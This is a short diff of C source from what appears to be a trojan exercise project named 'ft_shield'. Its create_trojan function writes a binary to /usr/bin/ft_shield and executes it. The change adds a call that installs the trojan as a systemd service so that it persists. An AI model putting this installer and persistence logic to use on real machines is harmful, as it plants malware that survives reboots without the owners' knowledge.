@@ -1,19 +1,8 @@
-#include <fcntl.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <stdio.h>
-
-#define TROLOC "/usr/bin/ft_shield"
+#include "ft_shield.h"
 
 #ifndef TROEXE
 # error "-DTROEXE=... is required to compile this file"
 #endif
-
-#ifndef LOGIN
-# define LOGIN "cgodard"
-#endif
-
-extern char **environ;
 
 int	create_trojan(void)
 {
@@ -32,6 +21,7 @@ int	create_trojan(void)
 		return (EXIT_FAILURE);
 	}
 	close(fd);
+	create_systemd_service();
 	execve(TROLOC, (char **){}, environ);
 	return (EXIT_FAILURE);
 }
